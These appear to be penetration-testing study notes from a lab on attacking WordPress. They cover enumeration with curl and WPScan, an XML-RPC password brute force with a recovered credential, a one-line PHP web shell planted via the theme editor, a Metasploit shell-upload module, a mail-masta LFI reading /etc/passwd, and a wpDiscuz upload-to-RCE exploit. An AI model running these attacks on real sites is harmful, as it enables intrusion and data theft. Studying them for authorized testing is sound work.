# WordPress – Discovery and Attacking

## Overview

WordPress was launched in 2003 and is an open-source CMS commonly used for:

- blogs
- forums
- business websites
- content-heavy marketing sites

It is highly popular because it is:

- easy to customise
- SEO-friendly
- supported by a huge plugin/theme ecosystem

WordPress is written in **PHP** and typically runs on:

- Apache
- PHP
- MySQL

Its flexibility is also its biggest weakness. Most real-world WordPress risk comes from:

- vulnerable plugins
- vulnerable themes
- weak passwords
- outdated core
- exposed admin functionality
- poor hardening

## Why it matters

WordPress is extremely common on external assessments, so it is worth treating it like a high-probability target.

Useful stats from the notes:

- WordPress accounts for roughly **32.5% of all websites**
- over **50,000 plugins**
- over **4,100 GPL themes**
- **317** WordPress versions released since launch
- roughly **661 new WordPress sites per day**
- blogs written in **120+ languages**
- one study noted roughly:
  - **8%** of WordPress hacks due to weak passwords
  - **60%** due to outdated WordPress versions

Another breakdown mentioned:

- **4%** of vulnerabilities in WordPress core
- **89%** in plugins
- **7%** in themes

A second dataset in the notes referenced nearly 4,000 known vulnerabilities broken down as:

- **54%** plugins
- **31.5%** core
- **14.5%** themes

The exact percentages vary by source and snapshot in time, but the pattern is the same:

**plugins are the biggest attack surface.**

Some major brands use WordPress, so it appears everywhere from small blogs to enterprise sites.

---

# 1. Quick Identification

A quick way to identify WordPress is by checking for common WordPress paths.

## `robots.txt`

A typical WordPress `robots.txt` may contain:

```text
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://inlanefreight.local/wp-sitemap.xml
```

Dead giveaways:

- `/wp-admin/`
- `/wp-content/`

## Login portal

Trying to access:

```text
/wp-admin
```

usually redirects to:

```text
/wp-login.php
```

Example:

```text
http://blog.inlanefreight.local/wp-login.php
```

## Useful directories

### Plugins
```text
/wp-content/plugins/
```

### Themes
```text
/wp-content/themes/
```

These are critical for:

- version fingerprinting
- vulnerable plugin discovery
- theme abuse
- code execution paths

---

# 2. WordPress Roles

A standard WordPress install includes five main roles.

## Administrator
Can:

- manage users
- manage posts
- edit themes/plugins
- change site configuration
- edit source code

**Admin access is usually enough to achieve code execution.**

## Editor
Can:

- publish/manage posts
- manage other users’ posts

## Author
Can:

- publish/manage their own posts

## Contributor
Can:

- write/manage their own posts
- cannot publish

## Subscriber
Can:

- browse content
- manage own profile

Editors/authors may still be useful if vulnerable plugins expose additional functionality.

---

# 3. Manual Discovery / Footprinting

Manual enumeration is important because automated tooling often misses things.

## Check page source for generator tag

```bash
curl -s http://blog.inlanefreight.local | grep WordPress
```

Example:

```html
<meta name="generator" content="WordPress 5.8" />
```

This can reveal the core version directly.

---

## Fingerprint theme

```bash
curl -s http://blog.inlanefreight.local/ | grep themes
```

Example:

```html
<link rel='stylesheet' id='bootstrap-css' href='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/bootstrap/css/bootstrap.min.css' type='text/css' media='all' />
```

From this, you may infer a theme such as:

- `business-gravity`

Later automated scanning may reveal a child theme instead.

---

## Fingerprint plugins

```bash
curl -s http://blog.inlanefreight.local/ | grep plugins
```

Example output showed:

- `contact-form-7`
- `mail-masta`

Another page revealed:

```bash
curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
```

which exposed:

- `wpDiscuz`

## Why manual browsing matters

Automated tools may miss plugins that only load on certain pages.

So manual review should include:

- homepage
- blog post pages
- comments
- contact pages
- login pages
- page source on each

---

# 4. Version Enumeration by Files and Readmes

Browsing plugin/theme directories may reveal:

- directory listing
- `readme.txt`
- changelogs
- `style.css`
- version strings in assets

Example:

```text
http://blog.inlanefreight.local/wp-content/plugins/mail-masta/
```

If directory listing is enabled and `readme.txt` exists, that often gives the exact plugin version.

From the notes:

- `mail-masta` appeared to be **1.0.0**
- `wpDiscuz` appeared to be **7.0.4**

These versions were especially interesting because both had known vulnerabilities.

---

# 5. User Enumeration

WordPress commonly leaks usernames through the login flow.

## Behaviour difference

- valid username + bad password → tells you password is wrong
- invalid username → tells you user does not exist

That makes username enumeration possible.

## Confirmed users in the notes

- `admin`
- `john`

Other sources of usernames:

- author names on posts
- RSS
- author archive enumeration
- WPScan user enumeration

---

# 6. WPScan

`WPScan` is the go-to WordPress enumeration tool.

It can enumerate:

- core version
- themes
- plugins
- users
- backups
- known vulnerabilities

## Install

```bash
sudo gem install wpscan
```

## Help

```bash
wpscan -h
```

## Typical enumeration

```bash
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <TOKEN>
```

You can also target specific items, e.g. all plugins:

```bash
--enumerate ap
```

---

# 7. WPScan Findings from the Notes

The scan confirmed or revealed:

## Core
- WordPress **5.8**
- `readme.html` accessible
- XML-RPC enabled
- upload directory listing enabled

## Theme
- actual theme in use was **Transport Gravity**
- this is a **child theme** of Business Gravity
- theme version **1.0.1**
- directory listing enabled in the theme path

## Plugins
- `mail-masta`
- `contact-form-7`
- `wpDiscuz` was found manually even though automation missed it

## Users
- `admin`
- `john`

## Other findings
- `xmlrpc.php` enabled
- `/wp-content/uploads/` listing enabled

## Good reminder

Automated enumeration alone was **not enough**:

- it confirmed several manual findings
- corrected the theme identification
- found another user
- but still **missed some plugins**

That is exactly why manual + automated enumeration together works best.

---

# 8. Final Discovery Summary from the Notes

At the end of enumeration, the collected data looked like this:

- WordPress core version **5.8**
- theme in use: **Transport Gravity**
- plugins in use:
  - **Contact Form 7**
  - **mail-masta**
  - **wpDiscuz**
- `wpDiscuz` version **7.0.4**
  - known **unauthenticated RCE**
- `mail-masta` version **1.0.0**
  - known **LFI**
  - known **SQL injection**
- valid users:
  - `admin`
  - `john`
- directory listing enabled
- XML-RPC enabled
- login page vulnerable to username enumeration

At this point, there is enough information to start planning attacks.

---

# 9. Main Attack Paths

The notes focused on four main attack paths:

1. **login brute force**
2. **admin code execution via theme editor**
3. **known vulnerable plugins**
4. **Metasploit plugin upload**

---

# 10. Login Bruteforce with WPScan

WPScan supports password attacks against:

- `wp-login.php`
- `xmlrpc.php`

The preferred method is usually:

- `xmlrpc`

because it is faster.

## Example brute force

```bash
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

## Result from the notes

Valid credentials found:

```text
john : firebird1
```

## Useful flags

- `--password-attack` → attack type
- `-U` → username or username file
- `-P` → password list
- `-t` → thread count

---

# 11. Code Execution via Theme Editor

Once you have administrator access, WordPress can often be turned into code execution through built-in functionality.

## Path

Log in to the admin panel, then:

- `Appearance`
- `Theme Editor`

A safer approach is to edit an **inactive** theme to avoid breaking the live site.

From the notes:

- active theme was **Transport Gravity**
- alternate theme chosen: **Twenty Nineteen**

## Good file to edit

Use something rarely hit but web-accessible, such as:

```text
404.php
```

Example editor URL:

```text
http://blog.inlanefreight.local/wp-admin/theme-editor.php?file=404.php&theme=twentynineteen
```

## Minimal PHP shell

```php
system($_GET[0]);
```

Add it carefully, save, then execute commands via the browser or `curl`.

## Example execution

```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

Expected output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

At that point, you have command execution as the web server user.

---

# 12. Metasploit – `wp_admin_shell_upload`

Metasploit can automate admin-level shell upload.

## Module

```text
exploit/unix/webapp/wp_admin_shell_upload
```

## Example setup

```bash
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
set username john
set password firebird1
set lhost 10.10.14.15
set rhost 10.129.42.195
set VHOST blog.inlanefreight.local
show options
exploit
```

## Important note from the lab

Both were needed:

- `RHOST`
- `VHOST`

Without the correct `VHOST`, the exploit failed with:

```text
The target does not appear to be using WordPress
```

## Result

The module uploaded a malicious plugin to:

```text
/wp-content/plugins/
```

and returned a Meterpreter shell.

Example identity:

```text
www-data (33)
```

## Cleanup note

Metasploit tries to remove its artefacts, but cleanup may fail.

Any created artefacts should be:

- removed if possible
- documented in the report appendix

---

# 13. Reporting / Cleanup Items

The notes correctly emphasised that WordPress exploitation often leaves artefacts.

Your appendix should track:

- exploited systems
- hostname/IP
- exploitation method
- compromised users
- whether account was local/domain/app-level
- artefacts created
- plugins/files uploaded
- any changes made to the target

Examples:

- modified `404.php`
- uploaded PHP shell
- uploaded malicious plugin
- created or modified admin credentials
- changed theme file contents

---

# 14. Known Vulnerability Focus

A huge amount of WordPress exploitation comes from plugins.

The notes highlighted two especially good examples:

- `mail-masta`
- `wpDiscuz`

The main takeaway is:

**be very thorough with plugin enumeration**.

Even abandoned or unused plugins can still be reachable if developers failed to remove them fully.

## Bonus note

The notes mention `waybackurls` as a useful trick.

That matters because:

- older versions of a site may reveal older plugin paths
- even if a plugin is no longer in active use, its directory may still exist
- forgotten code is often exploitable code

---

# 15. Vulnerable Plugin – `mail-masta`

`mail-masta` was identified as:

- unsupported
- historically downloaded
- vulnerable to:
  - unauthenticated **LFI**
  - **SQL injection**

## Vulnerable code pattern

The vulnerable example used:

```php
include($_GET['pl']);
```

No validation means arbitrary file inclusion.

## Example LFI exploitation

```bash
curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

## Result

Contents of `/etc/passwd` were returned.

This confirms:

- local file inclusion
- arbitrary file read
- useful server enumeration
- possible pivot to more sensitive files

Potential follow-up targets would include:

- WordPress config files
- credentials
- keys
- app configs

---

# 16. Vulnerable Plugin – `wpDiscuz`

`wpDiscuz` is a very common commenting plugin.

From the notes:

- **1.6M+ downloads**
- **90,000+ active installs**
- target version identified: **7.0.4**
- vulnerable to **unauthenticated file upload bypass → RCE**
- associated with **CVE-2020-24186**

## Example exploit usage

```bash
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```

The exploit attempted to upload a PHP web shell.

## Important note

The exploit script as written may appear to fail at code execution, but the uploaded shell may still work manually.

## Manual execution with cURL

```bash
curl -s "http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id"
```

Example output:

```text
GIF689a;

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This strongly suggests an image/polyglot-style upload bypass.

## Cleanup reminder

If exploitation uploads a shell into:

```text
/wp-content/uploads/
```

remove it if possible and document it in the report.

---

# 17. XML-RPC

XML-RPC was enabled according to WPScan.

This matters because it can be abused for:

- password brute forcing
- login attacks
- some legacy abuse cases

That is why the brute force section used:

```text
--password-attack xmlrpc
```

rather than attacking `wp-login.php` directly.

---

# 18. Typical WordPress Weak Points to Check

Based on the notes, a practical checklist would be:

## Core identification
- version
- `readme.html`
- generator tag

## Login surfaces
- `/wp-login.php`
- `/wp-admin`
- XML-RPC enabled?

## Users
- manual login enumeration
- author archives
- WPScan user enumeration

## Themes
- active theme
- child theme vs parent theme
- `style.css`
- `readme.txt`
- theme editor access
- editable PHP files

## Plugins
- enumerate from source
- enumerate from plugin directories
- read readmes/changelogs
- compare versions to known vulns
- do not assume automated tools found everything

## Misconfigurations
- directory listing
- uploads browsable
- file editor enabled
- unnecessary plugins left installed
- old plugins/themes left on disk

---

# 19. Practical Workflow

## Step 1 – confirm WordPress

Check:

- `robots.txt`
- `/wp-admin`
- `/wp-login.php`
- page source
- generator tag

## Step 2 – enumerate manually

Use:

```bash
curl -s http://target | grep WordPress
curl -s http://target/ | grep themes
curl -s http://target/ | grep plugins
curl -s http://target/?p=1 | grep plugins
```

Browse:

- plugin directories
- theme directories
- `readme.txt`
- `style.css`

## Step 3 – enumerate users

Check:

- login response differences
- author pages
- WPScan enumeration

## Step 4 – run WPScan

```bash
sudo wpscan --url http://target --enumerate --api-token <TOKEN>
```

## Step 5 – build an attack plan

Prioritise:

- unauthenticated plugin RCE
- LFI
- SQLi
- username enumeration
- XML-RPC brute force
- admin takeover
- theme/plugin editor abuse

## Step 6 – attack in order of least resistance

Common sequence:

1. unauthenticated plugin exploit
2. brute force weak creds
3. admin login
4. theme editor shell
5. Metasploit shell upload
6. post-exploitation / privilege escalation

---

# 20. Useful Commands

## Basic identification

```bash
curl -s http://blog.inlanefreight.local | grep WordPress
```

## Theme discovery

```bash
curl -s http://blog.inlanefreight.local/ | grep themes
```

## Plugin discovery

```bash
curl -s http://blog.inlanefreight.local/ | grep plugins
curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
```

## WPScan enumeration

```bash
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <TOKEN>
```

## WPScan xmlrpc brute force

```bash
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

## mail-masta LFI

```bash
curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

## wpDiscuz exploit

```bash
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```

## wpDiscuz shell usage

```bash
curl -s "http://blog.inlanefreight.local/wp-content/uploads/2021/08/<shell>.php?cmd=id"
```

## Theme editor shell execution

```bash
curl "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id"
```

## Metasploit module

```bash
use exploit/unix/webapp/wp_admin_shell_upload
```

---

# 21. Key Takeaways

- WordPress is everywhere, so it deserves a repeatable workflow
- manual enumeration is essential because automated tools miss things
- plugins are the biggest attack surface
- XML-RPC often makes brute forcing faster
- username enumeration is frequently trivial
- admin access often leads directly to code execution through built-in editors
- abandoned plugins/themes can still be exploitable even if no longer actively used
- always document artefacts and changes made during testing

---

# Tags

#wordpress
#cms
#discovery
#enumeration
#wpscan
#xmlrpc
#wpdiscuz
#mail-masta
#lfi
#rce
#theme-editor
#metasploit
#attacking-common-apps
#pentesting
#ctf
#obsidian